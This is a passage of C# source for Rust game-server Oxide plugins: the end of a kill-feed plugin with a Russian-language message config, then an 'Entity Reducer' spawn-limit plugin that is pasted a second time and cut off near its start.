            private DeathReason InitializeReason()
            {
                if (Attacker.Type == AttackerType.Turret)
                    return DeathReason.Turret;

                if (Attacker.Type == AttackerType.Guntrap)
                    return DeathReason.Guntrap;

                if (Attacker.Type == AttackerType.Zombie)
                    return DeathReason.Zombie;

                else if (Attacker.Type == AttackerType.Helicopter)
                    return DeathReason.Helicopter;

                else if (Attacker.Type == AttackerType.BradleyAPC)
                    return DeathReason.BradleyAPC;

                else if (Victim.Type == VictimType.Helicopter)
                    return DeathReason.HelicopterDeath;

                else if (Victim.Type == VictimType.BradleyAPC)
                    return DeathReason.BradleyAPCDeath;

                else if (Attacker.Type == AttackerType.Structure)
                    return DeathReason.Structure;

                else if (Attacker.Type == AttackerType.Trap)
                    return DeathReason.Trap;

                else if (Attacker.Type == AttackerType.Animal)
                    return DeathReason.Animal;

                else if (Victim.Type == VictimType.Animal)
                    return DeathReason.AnimalDeath;

                else if (Weapon == "F1 Grenade" || Weapon == "Survey Charge" || Weapon == "Timed Explosive Charge" || Weapon == "Satchel Charge" || Weapon == "Beancan Grenade")
                    return DeathReason.Explosion;

                else if (Weapon == "Flamethrower")
                    return DeathReason.Flamethrower;

                else if (Victim.Type == VictimType.Player || Victim.Type == VictimType.NPC)
                    return GetDeathReason(DamageType);

                if (Victim.Type == VictimType.Zombie)
                    return DeathReason.ZombieDeath;

                return DeathReason.Unknown;
            }

            private DeathReason GetDeathReason(string damage)
            {
                var reasons = (Enum.GetValues(typeof(DeathReason)) as DeathReason[]).Where(x => x.ToString().Contains(damage));

                if (reasons.Count() == 0)
                    return DeathReason.Unknown;
                return reasons.First();
            }

            private string InitializeDeathMessage()
            {
                string message = string.Empty;
                string reason = string.Empty;

                if (Victim.Type == VictimType.Player && Victim.Entity.ToPlayer().IsSleeping() && _config.Messages.ContainsKey(Reason + " Sleeping"))
                    reason = Reason + " Sleeping";
                else
                    reason = Reason.ToString();

                message = GetMessage(reason, _config.Messages);

                var attackerName = Attacker.Name;
                if (string.IsNullOrEmpty(attackerName) && Attacker.Entity == null && Weapon.Contains("Heli"))
                    attackerName = _config.HelicopterName;

                if (string.IsNullOrEmpty(attackerName) && Attacker.Entity == null && Weapon.Contains("Bradl"))
                    attackerName = _config.BradleyAPCName;


                switch (Attacker.Type)
                {
                    case AttackerType.ZombieDeath:
                        attackerName = _config.ZombieName;
                        break;

                    case AttackerType.Zombie:
                        attackerName = _config.ZombieName;
                        break;

                    case AttackerType.Helicopter:
                        attackerName = _config.HelicopterName;
                        break;

                    case AttackerType.BradleyAPC:
                        attackerName = _config.BradleyAPCName;
                        break;

                    case AttackerType.NPC:
                        attackerName = _config.NPCName;
                        break;

                    case AttackerType.Turret:
                        attackerName = GetMessage(attackerName, _config.Turrets);
                        break;
                    case AttackerType.Guntrap:
                        attackerName = GetMessage(attackerName, _config.Turrets);
                        break;

                    case AttackerType.Trap:
                        attackerName = GetMessage(attackerName, _config.Traps);
                        break;

                    case AttackerType.Animal:
                        attackerName = GetMessage(attackerName, _config.Animals);
                        break;

                    case AttackerType.Structure:
                        attackerName = GetMessage(attackerName, _config.Structures);
                        break;

                }

                var victimName = Victim.Name;
                switch (Victim.Type)
                {
                    case VictimType.Helicopter:
                        victimName = _config.HelicopterName;
                        break;

                    case VictimType.BradleyAPC:
                        victimName = _config.BradleyAPCName;
                        break;

                    case VictimType.Zombie:
                        victimName = _config.ZombieName;
                        break;

                    case VictimType.Animal:
                        victimName = GetMessage(victimName, _config.Animals);
                        break;
                }
                var reply = 0;
                var victimColor = _config.ColorPrivilage["deathmessages.default"].ColorDeath;
                var attackerColor = _config.ColorPrivilage["deathmessages.default"].ColorAttacker;
                foreach (var color in _config.ColorPrivilage)
                {
                    if (Attacker.Entity != null && Attacker.Entity.ToPlayer())
                        if (ins.permission.UserHasPermission(Attacker.Entity.ToPlayer().UserIDString, color.Key))
                            attackerColor = color.Value.ColorAttacker;
                    if (Victim.Entity != null && Victim.Entity.ToPlayer())
                        if (ins.permission.UserHasPermission(Victim.Entity.ToPlayer().UserIDString, color.Key))
                            victimColor = color.Value.ColorDeath;
                }
                message = message.Replace("{victim}", $"<color={victimColor}>{victimName}</color>");
                message = message.Replace("{attacker}", $"<color={attackerColor}>{attackerName}</color>");
                message = message.Replace("{distance}", $"<color={_config.ColorDistance}>{Math.Round(Distance, 0)}</color>");
                message = message.Replace("{weapon}", $"<color={_config.ColorWeapon}>{GetMessage(Weapon, _config.Weapons)}</color>");
                message = message.Replace("{bodypart}", $"<color={_config.ColorBodyPart}>{GetMessage(BodyPart, _config.BodyParts)}</color>");
                return message;
            }
        }

        #endregion

        #region Oxide Hooks
        private static PluginConfig _config;

        protected override void LoadDefaultConfig()
        {
            PrintWarning("Благодарим за приобритение плагина на сайте RustPlugin.ru. Если вы приобрели этот плагин на другом ресурсе знайте - это лишает вас гарантированных обновлений!");
            _config = PluginConfig.DefaultConfig();
        }
        protected override void LoadConfig()
        {
            base.LoadConfig();
            _config = Config.ReadObject<PluginConfig>();
            if (_config.PluginVersion < Version)
                UpdateConfigValues();
            Config.WriteObject(_config, true);
        }

        private void UpdateConfigValues()
        {
            PluginConfig baseConfig = PluginConfig.DefaultConfig();
            if (_config.PluginVersion < new VersionNumber(0, 1, 0))
            {
                PrintWarning("Config update detected! Updating config values...");
                PrintWarning("Config update completed!");
            }
            _config.PluginVersion = Version;
        }


        protected override void SaveConfig()
        {
            Config.WriteObject(_config);
        }

        class PluginConfig
        {
            [JsonProperty("Configuration Version")]
            public VersionNumber PluginVersion = new VersionNumber();

            [JsonProperty("A. Время показа сообщения (сек)")]
            public int Cooldown { get; set; }
            [JsonProperty("B. Размер текста")]
            public int FontSize { get; set; }
            [JsonProperty("C. Показывать убиства животных")]
            public bool ShowDeathAnimals { get; set; }
            [JsonProperty("C1. Показывать убиства NPC")]
            public bool ShowDeathNPC { get; set; }
            [JsonProperty("D. Показывать убийства спящих")]
            public bool ShowDeathSleepers { get; set; }
            [JsonProperty("E. Хранение логов")]
            public bool Log { get; set; }
            [JsonProperty("H. Цвет оружия")]
            public string ColorWeapon { get; set; }
            [JsonProperty("I. Цвет дистанции")]
            public string ColorDistance { get; set; }
            [JsonProperty("J. Цвет части тела")]
            public string ColorBodyPart { get; set; }
            [JsonProperty("K. Дистанция")]
            public double Distance { get; set; }
            [JsonProperty("L. Название вертолета")]
            public string HelicopterName { get; set; }
            [JsonProperty("M. Название Bradlay (Танк)")]
            public string BradleyAPCName { get; set; }
            [JsonProperty("N. Имя NPC")]
            public string NPCName { get; set; }
            [JsonProperty("O. Имя Zombie")]
            public string ZombieName { get; set; }
            [JsonProperty("P. Выводить убийства в консоль")]
            public bool ShowColsole { get; set; }
            [JsonProperty("Оружие")]
            public Dictionary<string, string> Weapons { get; set; }
            [JsonProperty("Цвета имени в UI")]
            public Dictionary<string, ColorsPrivilage> ColorPrivilage
            {
                get; set;
            }

            [JsonProperty("Позиция: AnchorMin (Это изнаальная позиция точки, от неё в лево будет уходить основное UI по оффсетам, дефолт 1 1 - Верхний правый угол)")]
            public string AnchorMin = "1 1";
            [JsonProperty("Позиция: AnchorMax (Это изнаальная позиция точки, от неё в лево будет уходить основное UI по оффсетам, дефолт 1 1 - Верхний правый угол)")]
            public string AnchorMax = "1 1";
            [JsonProperty("Конструкции")]
            public Dictionary<string, string> Structures { get; set; }
            [JsonProperty("Ловушки")]
            public Dictionary<string, string> Traps { get; set; }
            [JsonProperty("Турели")]
            public Dictionary<string, string> Turrets { get; set; }
            [JsonProperty("Животные")]
            public Dictionary<string, string> Animals { get; set; }
            [JsonProperty("Сообщения ({attacker} - инициатор,  {victim} - жертва, {weapon} - оружие,  {distance} - дистанция, {bodypart} - часть тела")]
            public Dictionary<string, string> Messages { get; set; }
            [JsonProperty("Части тела")]
            public Dictionary<string, string> BodyParts { get; set; }


            [JsonIgnore]
            [JsonProperty("Server Initialized")]
            public bool Init = false;

            public static PluginConfig DefaultConfig()
            {
                return new PluginConfig()
                {
                    PluginVersion = new VersionNumber(),
                    Cooldown = 7,
                    FontSize = 15,
                    Distance = -1,
                    Log = true,
                    ShowDeathAnimals = true,
                    ShowDeathNPC = true,
                    ShowDeathSleepers = true,
                    ShowColsole = false,
                    ColorDistance = "#ff9c00",
                    ColorWeapon = "#ffffff",
                    ColorBodyPart = "#ffffff",
                    HelicopterName = "Вертолет",
                    BradleyAPCName = "Танк",
                    NPCName = "НПЦ",
                    ZombieName = "Зомби",
                    AnchorMin = "1 1",
                    AnchorMax = "1 1",
                    ColorPrivilage = new Dictionary<string, ColorsPrivilage>
                    {
                        ["deathmessages.default"] = new ColorsPrivilage
                        {
                            ColorAttacker = "#ff9c00",
                            ColorDeath = "#ff9c00"
                        },
                        ["deathmessages.vip"] = new ColorsPrivilage
                        {
                            ColorAttacker = "#F70233",
                            ColorDeath = "#757575"
                        },
                        ["deathmessages.elite"] = new ColorsPrivilage
                        {
                            ColorAttacker = "#DF0BBA",
                            ColorDeath = "#D1D1D1"
                        },
                    },

                    Weapons = new Dictionary<string, string>
                {
                    { "Assault Rifle", "Assault Rifle" },
                    { "Assault Rifle - ICE", "Assault Rifle" },
                    { "Beancan Grenade", "Beancan" },
                    { "Nailgun", "Гвоздострел" },
                    { "Bolt Action Rifle", "Bolt Action Rifle" },
                    { "Bone Club", "Bone Club" },
                    { "Bone Knife", "Bone Knife" },
                    { "Crossbow", "Crossbow" },
                    { "Flamethrower", "Flamethrower" },
                       { "Explosivesatchel", "Explosivesatchel" },
                    { "Custom SMG", "SMG" },
                    { "Double Barrel Shotgun", "Double Shotgun" },
                    { "Compound Bow", "Compound Bow" },
                    { "Eoka Pistol", "Eoka" },
                    { "F1 Grenade", "F1" },
                    { "Flame Thrower", "Flame Thrower" },
                    { "Hunting Bow", "Hunting Bow" },
                    { "Longsword", "Longsword" },
                    { "LR-300 Assault Rifle", "LR-300" },
                    { "M249", "М249" },
                    { "M92 Pistol", "M92" },
                    { "Mace", "Mace" },
                    { "Machete", "Machete" },
                    { "MP5A4", "MP5A4" },
                    { "Pump Shotgun", "Shotgun" },
                    { "Python Revolver", "Python Revolver" },
                    { "Revolver", "Revolver" },
                    { "Salvaged Cleaver", "Salvaged Cleaver" },
                    { "Salvaged Sword", "Salvaged Sword" },
                    { "Semi-Automatic Pistol", "Semi-Automatic Pistol" },
                    { "Semi-Automatic Rifle", "Semi-Automatic Rifle" },
                    { "Stone Spear", "Stone Spear" },
                    { "Thompson", "Thompson" },
                    { "Waterpipe Shotgun", "Waterpipe Shotgun" },
                    { "Wooden Spear", "Wooden Spear" },
                    { "Hatchet", "Hatchet" },
                    { "Pick Axe", "Pick Axe" },
                    { "Salvaged Axe", "Salvaged Axe" },
                    { "Salvaged Hammer", "Salvaged Hammer" },
                    { "Salvaged Icepick", "Salvaged Icepick" },
                    { "Satchel Charge", "Satchel Charge" },
                    { "Stone Hatchet", "Stone Hatchet" },
                    { "Stone Pick Axe", "Stone Pick Axe" },
                    { "Survey Charge", "Survey Charge" },
                    { "Timed Explosive Charge", "С4" },
                    { "Torch", "Torch" },
                    { "Stone Pickaxe", "Stone Pickaxe" },
                    { "RocketSpeed", "Скоростная ракета" },
                    { "Incendiary Rocket", "Зажигательная ракета" },
                    { "Rocket", "Обычная ракета" },
                    { "RocketHeli", "Напалм" },
                    { "RocketBradley", "Напалм" },
                    { "Spas-12 Shotgun", "Spas-12 Shotgun" },
                    {"Multiple Grenade Launcher", "Multiple Grenade Launcher" },
                    {"40mm.grenade.he", "Multiple Grenade Launcher" },
                },

                    Structures = new Dictionary<string, string>
                {
                    { "Wooden Barricade", "Деревянная баррикада" },
                    { "Barbed Wooden Barricade", "Колючая деревянная баррикада" },
                    { "Metal Barricade", "Металлическая баррикада" },
                    { "High External Wooden Wall", "Высокая внешняя деревянная стена" },
                    { "High External Stone Wall", "Высокая внешняя каменная стена" },
                    { "High External Wooden Gate", "Высокие внешние деревянные ворота" },
                    { "High External Stone Gate", "Высокие внешние каменные ворота" }
                },

                    Traps = new Dictionary<string, string>
                {
                    { "Snap Trap", "Капкан" },
                    { "Land Mine", "Мина" },
                    { "Wooden Floor Spikes", "Деревянные колья" }
                },

                    Turrets = new Dictionary<string, string>
                {
                    { "Flame Turret", "Огнеметная турель" },
                    { "Auto Turret", "Автотурель" },
                    { "Guntrap", "Автодробовик" },
                    { "Static Turret", "Автоматическая туррель" },
                },

                    Animals = new Dictionary<string, string>
                {
                    { "Boar", "Кабан" },
                    { "Horse", "Лошадь" },
                    { "Wolf", "Волк" },
                    { "Stag", "Олень" },
                    { "Chicken", "Курица" },
                    { "Bear", "Медведь" }
                },

                    BodyParts = new Dictionary<string, string>
                {
                    { "body", "Тело" },
                    { "pelvis", "Таз" },
                    { "hip", "Бедро" },
                    { "left knee", "Левое колено" },
                    { "right knee", "Правое колено" },
                    { "left foot", "Левая стопа" },
                    { "right foot", "Правая стопа" },
                    { "left toe", "Левый палец" },
                    { "right toe", "Правый палец" },
                    { "groin", "Пах" },
                    { "lower spine", "Нижний позвоночник" },
                    { "stomach", "Желудок" },
                    { "chest", "Грудь" },
                    { "neck", "Шея" },
                    { "left shoulder", "Левое плечо" },
                    { "right shoulder", "Правое плечо" },
                    { "left arm", "Левая рука" },
                    { "right arm", "Правая рука" },
                    { "left forearm", "Левое предплечье" },
                    { "right forearm", "Правое предплечье" },
                    { "left hand", "Левая ладонь" },
                    { "right hand", "Правая ладонь" },
                    { "left ring finger", "Левый безымянный палец" },
                    { "right ring finger", "Правый безымянный палец" },
                    { "left thumb", "Левый большой палец" },
                    { "right thumb", "Правый большой палец" },
                    { "left wrist", "Левое запястье" },
                    { "right wrist", "Правое запястье" },
                    { "head", "Голова" },
                    { "jaw", "Челюсть" },
                    { "left eye", "Левый глаз" },
                    { "right eye", "Правый глаз" }
                },

                    Messages = new Dictionary<string, string>
                {
                    { "Arrow", "{attacker} убил {victim} ({weapon}, {distance} м.)" },
                    { "Blunt",  "{attacker} убил {victim} ({weapon})" },
                    { "Bullet", "{attacker} убил {victim} ({weapon}, {distance} м.)" },
                    { "Flamethrower", "{attacker} сжег заживо игрока {victim} ({weapon})" },
                    { "Drowned", "{victim} утонул." },
                    { "Explosion", "{attacker} взорвал игрока {victim} ({weapon})" },
                    { "Fall", "{victim} разбился." },
                    { "Generic", "Смерть забрала {victim} с собой." },
                    { "Heat", "{victim} сгорел заживо." },
                    { "Helicopter", "{attacker} прямым попаданием убил {victim}." },
                    { "BradleyAPC", "{attacker} прямым попаданием убил {victim}." },
                    { "BradleyAPCDeath", "{victim} был уничтожен игроком {attacker} ({weapon})" },
                    { "HelicopterDeath", "{victim} был сбит игроком {attacker} ({weapon})" },
                    { "Animal", "{attacker} добрался до {victim}" },
                    { "ZombieDeath", "{attacker} убил {victim} ({weapon}, {distance} м.)" },
                    { "Zombie", "{attacker} приследовал {victim}." },
                    { "AnimalDeath", "{attacker} убил {victim} ({weapon}, {distance} м.)" },
                    { "Hunger", "{victim} умер от голода." },
                    { "Poison", "{victim} умер от отравления." },
                    { "Radiation", "{victim} умер от радиационного отравления" },
                    { "Slash", "{attacker} убил {victim} ({weapon})" },
                    { "Stab", "{attacker} убил {victim} ({weapon})" },
                    { "Structure", "{victim} умер от сближения с {attacker}" },
                    { "Suicide", "{victim} совершил самоубийство." },
                    { "Thirst", "{victim} умер от обезвоживания" },
                    { "Trap", "{victim} попался на ловушку {attacker}" },
                    { "Cold", "{victim} умер от холода" },
                    { "Turret", "{victim} был убит автоматической турелью" },
                    { "Guntrap", "{victim} был убит ловушкой-дробовиком" },
                    { "Unknown", "У {victim} что-то пошло не так." },
                    { "Bleeding", "{victim} умер от кровотечения" },
                    { "Blunt Sleeping", "{attacker} убил {victim} ({weapon})" },
                    { "Bullet Sleeping", "{attacker} убил {victim} ({weapon}, {distance} метров)" },
                    { "Flamethrower Sleeping", "{attacker} сжег игрока {victim} ({weapon})" },
                    { "Explosion Sleeping", "{attacker} убил {victim} ({weapon})" },
                    { "Generic Sleeping", "Смерть забрала {victim} с собой пока он спал." },
                    { "Helicopter Sleeping", "{victim} был убит {attacker} пока он спал." },
                    { "BradleyAPC Sleeping", "{victim} был убит {attacker} пока он спал." },
                    { "Animal Sleeping", "{victim} убил {attacker} пока он спал." },
                    { "Slash Sleeping", "{attacker} убил {victim} ({weapon})" },
                    { "Stab Sleeping", "{attacker} убил {victim} ({weapon})" },
                    { "Unknown Sleeping", "У игрока {victim} что-то пошло не так." },
                    { "Turret Sleeping", "{attacker} был убит автоматической турелью." }
                }
                };
            }
        }

        private void OnServerInitialized()
        {
            ins = this;
            PermissionService.RegisterPermissions(this, _config.ColorPrivilage.Keys.ToList());
        }

        private Dictionary<uint, BasePlayer> LastHeli = new Dictionary<uint, BasePlayer>();

        private void OnEntityTakeDamage(BaseCombatEntity entity, HitInfo info)
        {
            if (entity is BasePlayer)
                _lastHits[entity.ToPlayer().userID] = info;
            if (entity is BaseHelicopter && info.InitiatorPlayer != null)
                LastHeli[entity.net.ID] = info.InitiatorPlayer;
        }

        private void OnEntityDeath(BaseCombatEntity victim, HitInfo info)
        {
            try
            {
                if (info == null)
                    if (!(victim is BasePlayer) || !victim.ToPlayer().IsWounded() || !_lastHits.TryGetValue(victim.ToPlayer().userID, out info))
                        return;
                if (victim is BaseCorpse) return;
                var _weapon = FirstUpper(info?.Weapon?.GetItem()?.info?.displayName?.english) ?? FormatName(info?.WeaponPrefab?.name);
                var _damageType = FirstUpper(victim.lastDamage.ToString());

                var _victim = new Victim(victim);
                if (_victim == null)
                    return;
                var _attacker = new Attacker(info.Initiator);
                if (_attacker == null)
                    return;
                if (_victim.Type == VictimType.Invalid)
                    return;
                if (_victim.Type == VictimType.Helicopter)
                {
                    if (LastHeli.ContainsKey(victim.net.ID))
                        _attacker = new Attacker(LastHeli[victim.net.ID]);
                }

                if ((_victim.Type == VictimType.Zombie && _attacker.Type == AttackerType.NPC))
                    return;

                if (!_config.ShowDeathAnimals && _victim.Type == VictimType.Animal || _attacker.Type == AttackerType.Animal) return;

                if (!_config.ShowDeathNPC && _victim.Type == VictimType.NPC || _attacker.Type == AttackerType.NPC)
                    return;

                if (_victim.Type == VictimType.Player && _victim.Entity.ToPlayer().IsSleeping() && !_config.ShowDeathSleepers)
                    return;

                var _bodyPart = victim?.skeletonProperties?.FindBone(info.HitBone)?.name?.english ?? "";
                var _distance = info.ProjectileDistance;

                if (_config.Log && _victim.Type == VictimType.Player && _attacker.Type == AttackerType.Player)
                {
                    LogToFile("log", $"[{DateTime.Now.ToShortTimeString()}] {info.Initiator} убил {victim} ({_weapon} [{_bodyPart}] с дистанции {_distance})", this, true);
                }

                if (_config.ShowColsole && _attacker.Type == AttackerType.Player)
                {
                    Puts($"[{DateTime.Now.ToShortTimeString()}] {info.Initiator} убил {victim} ({_weapon} [{_bodyPart}] с дистанции {_distance})");
                }

                AddNote(new DeathMessage(_attacker, _victim, _weapon, _damageType, _bodyPart, _distance));
            }
            catch (NullReferenceException)
            {
            }
        }

        private void Unload()
        {
            foreach (var player in BasePlayer.activePlayerList)
                DestroyUI(player);
        }

        #endregion

        #region Core

        private void AddNote(DeathMessage note)
        {
            _notes.Insert(0, note);
            RefreshUI(note);
            timer.Once(_config.Cooldown, () =>
            {
                _notes.Remove(note);
                foreach (var player in note.Players)
                    CuiHelper.DestroyUi(player, note.UINotes);
            });
        }

        #endregion

        #region UI

        private void RefreshUI(DeathMessage note)
        {
            foreach (var player in note.Players)
                InitilizeUI(player);
        }

        private void DestroyUI(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, "ui.deathmessages");
        }

        private void InitilizeUI(BasePlayer player)
        {
            var notes = _notes.Where(x => x.Players.Contains(player));

            if (notes.Count() == 0)
                return;

            var container = new CuiElementContainer();

            container.Add(new CuiPanel
            {
                Image = { Color = "0 0 0 0" },
                RectTransform = { AnchorMin = _config.AnchorMin, AnchorMax = _config.AnchorMax }
            }, "Hud", "ui.deathmessages");

            double index = 0;
            foreach (var note in notes)
            {
                CuiHelper.DestroyUi(player, note.UINotes);
                var label = InitilizeLabel(container, note.UINotes, note.Message, $"{index - (20 + _config.Distance)}", $"{index}");
                index -= 20 + _config.Distance;
            }
            CuiHelper.AddUi(player, container);
        }

        private string InitilizeLabel(CuiElementContainer container, string Name, string text, string offsetMin, string Offsetmax)
        {
            container.Add(new CuiElement
            {
                Name = Name,
                Parent = "ui.deathmessages",
                FadeOut = 0.3f,
                Components =
                {
                    new CuiTextComponent { Align = UnityEngine.TextAnchor.MiddleRight, FontSize = _config.FontSize, Text = text, Font = "robotocondensed-regular.ttf", FadeIn = 0.3f},
                    new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "0 0", OffsetMin = $"-500 {offsetMin}", OffsetMax = $"-5 {Offsetmax}" },
                    new CuiOutlineComponent { Color = "0 0 0 0.5", Distance = "1.0 -0.5" }
                }
            });
            return Name;
        }

        #endregion

        #region Helpers

        private static string FirstUpper(string str)
        {
            if (string.IsNullOrEmpty(str))
                return str;

            return string.Join(" ", str.Split(' ').Select(x => x.Substring(0, 1).ToUpper() + x.Substring(1, x.Length - 1)).ToArray());
        }

        private static string FormatName(string prefab)
        {
            if (string.IsNullOrEmpty(prefab))
                return string.Empty;
            var reply = 1;
            if (reply == 0) { }
            var formatedPrefab = FirstUpper(prefab.Split('/').Last().Replace(".prefab", "").Replace(".entity", "").Replace(".weapon", "").Replace(".deployed", "").Replace("_", "."));
            switch (formatedPrefab)
            {
                case "Autoturret.deployed": return "Auto Turret";
                case "Flameturret": return "Flame Turret";
                case "Guntrap.deployed": return "Guntrap";
                case "Beartrap": return "Snap Trap";
                case "Landmine": return "Land Mine";
                case "Spikes.floor": return "Wooden Floor Spikes";
                case "Barricade.wood": return "Wooden Barricade";
                case "Barricade.woodwire": return "Barbed Wooden Barricade";
                case "Barricade.metal": return "Metal Barricade";
                case "Wall.external.high.wood": return "High External Wooden Wall";
                case "Wall.external.high.stone": return "High External Stone Wall";
                case "Gates.external.high.stone": return "High External Wooden Gate";
                case "Gates.external.high.wood": return "High External Stone Gate";
                case "Stone.hatchet": return "Stone Hatchet";
                case "Stone.pickaxe": return "Stone Pickaxe";
                case "Survey.charge": return "Survey Charge";
                case "Explosive.satchel": return "Satchel Charge";
                case "Explosive.timed": return "Timed Explosive Charge";
                case "Grenade.beancan": return "Beancan Grenade";
                case "Grenade.f1": return "F1 Grenade";
                case "Hammer.salvaged": return "Salvaged Hammer";
                case "Axe.salvaged": return "Salvaged Axe";
                case "Icepick.salvaged": return "Salvaged Icepick";
                case "Spear.stone": return "Stone Spear";
                case "Spear.wooden": return "Wooden Spear";
                case "Knife.bone": return "Bone Knife";
                case "Rocket.basic": return "Rocket";
                case "Flamethrower": return "Flamethrower";
                case "Rocket.hv": return "RocketSpeed";
                case "Rocket.heli": return "RocketHeli";
                case "Rocket.bradley": return "RocketBradley";
                case "sentry.scientist.static": return "Static Turret";
                default: return formatedPrefab;
            }
        }

        private static string GetMessage(string name, Dictionary<string, string> source)
        {
            if (source.ContainsKey(name))
                return source[name];

            return name;
        }
        #endregion

        #region Permissions
        public static class PermissionService
        {
            public static Permission permission = Interface.GetMod().GetLibrary<Permission>();

            public static bool HasPermission(ulong playerid = 0, string permissionName = "")
            {
                return !string.IsNullOrEmpty(permissionName) && permission.UserHasPermission(playerid.ToString(), permissionName);
            }

            public static void RegisterPermissions(Plugin owner, List<string> permissions)
            {
                if (owner == null) throw new ArgumentNullException("owner");
                if (permissions == null) throw new ArgumentNullException("commands");

                foreach (var permissionName in permissions.Where(permissionName => !permission.PermissionExists(permissionName)))
                {
                    permission.RegisterPermission(permissionName, owner);
                }
            }
        }
        #endregion
    }
}


###using System;
using System.Collections.Generic;
using System.Text;
using ConVar;
using Newtonsoft.Json;
using Oxide.Core;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("Entity Reducer", "Arainrr", "2.1.3")]
    [Description("Controls all spawn populations on the server")]
    public class EntityReducer : RustPlugin
    {
        #region Oxide Hooks

        private void OnServerInitialized()
        {
            if (SpawnHandler.Instance == null || SpawnHandler.Instance.AllSpawnPopulations == null)
            {
                PrintError("The SpawnHandler is missing on your server, the plugin cannot be used");
                Interface.Oxide.UnloadPlugin(Name);
                return;
            }
            UpdateConfig();
            if (configData.pluginEnabled)
            {
                ApplySpawnHandler();
            }
        }

        #endregion Oxide Hooks

        #region Methods

        private void UpdateConfig()
        {
            var newPopulationSettings = new Dictionary<string, PopulationSetting>();
            for (int i = 0; i < SpawnHandler.Instance.AllSpawnPopulations.Length; i++)
            {
                var spawnPopulation = SpawnHandler.Instance.AllSpawnPopulations[i];
                if (spawnPopulation == null) continue;
                var spawnDistribution = SpawnHandler.Instance.SpawnDistributions[i];
                if (spawnDistribution == null) continue;
                int targetCount = SpawnHandler.Instance.GetTargetCount(spawnPopulation, spawnDistribution);
                PopulationSetting populationSetting;
                if (configData.populationSettings.TryGetValue(spawnPopulation.name, out populationSetting))
                {
                    if (!populationSetting.enabled)
                    {
                        populationSetting.targetCount = targetCount;
                    }
                    newPopulationSettings.Add(spawnPopulation.name, populationSetting);
                }
                else
                {
                    newPopulationSettings.Add(spawnPopulation.name, new PopulationSetting { targetCount = targetCount });
                }
            }
            configData.populationSettings = newPopulationSettings;
            SaveConfig();
        }

        private void ApplySpawnHandler()
        {
            foreach (var spawnPopulation in SpawnHandler.Instance.AllSpawnPopulations)
            {
                if (spawnPopulation == null) continue;
                PopulationSetting populationSetting;
                if (configData.populationSettings.TryGetValue(spawnPopulation.name, out populationSetting) && populationSetting.enabled)
                {
                    float num = TerrainMeta.Size.x * TerrainMeta.Size.z;
                    if (!spawnPopulation.ScaleWithLargeMaps)
                    {
                        num = Mathf.Min(num, 1.6E+07f);
                    }
                    var densityToMaxPopulation = num * 1E-06f * Spawn.max_density;
                    spawnPopulation.ScaleWithSpawnFilter = false;
                    spawnPopulation.ScaleWithServerPopulation = false;
                    spawnPopulation.EnforcePopulationLimits = true;
                    spawnPopulation.ScaleWithLargeMaps = true;
                    var targetDensity = populationSetting.targetCount / densityToMaxPopulation;
                    var convarControlledSpawnPopulation = spawnPopulation as ConvarControlledSpawnPopulation;
                    if (convarControlledSpawnPopulation != null)
                    {
                        ConsoleSystem.Command command = ConsoleSystem.Index.Server.Find(convarControlledSpawnPopulation.PopulationConvar);
                        command?.Set(targetDensity);
                    }
                    else spawnPopulation._targetDensity = targetDensity;
                }
            }
            SpawnHandler.Instance.EnforceLimits(true);
        }

        public string GetReport()
        {
            SpawnPopulation[] allSpawnPopulations = SpawnHandler.Instance.AllSpawnPopulations;
            SpawnDistribution[] spawnDistributions = SpawnHandler.Instance.SpawnDistributions;
            StringBuilder stringBuilder = new StringBuilder();
            if (allSpawnPopulations == null) stringBuilder.AppendLine("Spawn population array is null.");
            if (spawnDistributions == null) stringBuilder.AppendLine("Spawn distribution array is null.");
            if (allSpawnPopulations != null && spawnDistributions != null)
            {
                stringBuilder.AppendLine();
                stringBuilder.AppendLine("SpawnPopulationName".PadRight(40) + "CurrentPopulation".PadRight(25) + "MaximumPopulation");
                for (int i = 0; i < allSpawnPopulations.Length; i++)
                {
                    var spawnPopulation = allSpawnPopulations[i];
                    if (spawnPopulation == null) continue;
                    var spawnDistribution = spawnDistributions[i];
                    if (spawnDistribution == null) continue;
                    int currentCount = SpawnHandler.Instance.GetCurrentCount(spawnPopulation, spawnDistribution);
                    int targetCount = SpawnHandler.Instance.GetTargetCount(spawnPopulation, spawnDistribution);
                    stringBuilder.AppendLine(spawnPopulation.name.PadRight(40) + currentCount.ToString().PadRight(25) + targetCount);
                }
            }
            return stringBuilder.ToString();
        }

        #endregion Methods

        #region Commands

        [ConsoleCommand("er.fillpopulations")]
        private void CmdFillPopulations(ConsoleSystem.Arg arg)
        {
            SpawnHandler.Instance.FillPopulations();
            SendReply(arg, "Successfully filled all populations");
        }

        [ConsoleCommand("er.getreport")]
        private void CmdGetReport(ConsoleSystem.Arg arg) => SendReply(arg, GetReport());

        [ConsoleCommand("er.enforcelimits")]
        private void CmdEnforceLimits(ConsoleSystem.Arg arg)
        {
            SpawnHandler.Instance.EnforceLimits(true);
            SendReply(arg, "Successfully enforced all population limits");
        }

        #endregion Commands

        #region Configuration

        private ConfigData configData;

        private class ConfigData
        {
            [JsonProperty(PropertyName = "Enabled Plugin")]
            public bool pluginEnabled = false;

            [JsonProperty(PropertyName = "Population Settings")]
            public Dictionary<string, PopulationSetting> populationSettings = new Dictionary<string, PopulationSetting>();
        }

        private class PopulationSetting
        {
            [JsonProperty(PropertyName = "Enabled")]
            public bool enabled = true;

            [JsonProperty(PropertyName = "Target Count")]
            public int targetCount;
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                configData = Config.ReadObject<ConfigData>();
                if (configData == null)
                    LoadDefaultConfig();
            }
            catch (Exception ex)
            {
                PrintError($"The configuration file is corrupted. \n{ex}");
                LoadDefaultConfig();
            }
            SaveConfig();
        }

        protected override void LoadDefaultConfig()
        {
            PrintWarning("Creating a new configuration file");
            configData = new ConfigData();
        }

        protected override void SaveConfig() => Config.WriteObject(configData);

        #endregion Configuration
    }
}


###ПЛАГИН НА ОГРАНИЧЕНИЕ ОБЪЕКТОВ К ПРИМЕРУ КАМНЕЙ,ДЕРЕВЬЕВ  И Т.Д###


using System;
using System.Collections.Generic;
using System.Text;
using ConVar;
using Newtonsoft.Json;
using Oxide.Core;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("Entity Reducer", "Arainrr", "2.1.3")]
    [Description("Controls all spawn populations on the server")]
    public class EntityReducer : RustPlugin
    {
        #region Oxide Hooks

        private void OnServerInitialized()
        {
